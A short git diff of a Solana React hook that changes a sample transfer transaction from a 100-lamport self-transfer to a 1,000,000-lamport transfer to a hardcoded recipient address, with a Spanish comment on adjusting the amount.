@@ -61,11 +61,14 @@ export const useSignTransaction = ({ userId }: UseSignTransactionProps) => {
   };
 
   const createTransferTransaction = async (publicKey: PublicKey) => {
+    const toPublicKey = new PublicKey(
+      '9nJwpxx1A7yZeVFp5qBHwg5eDSfMjMDyam3ZDFVxmd4Y',
+    );
     const transaction = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: publicKey,
-        toPubkey: publicKey,
-        lamports: 100, // Ajusta la cantidad de lamports según sea necesario
+        toPubkey: toPublicKey,
+        lamports: 1000000, // Ajusta la cantidad de lamports según sea necesario  (1 SOL = 1,000,000,000 lamports)
       }),
     );
 
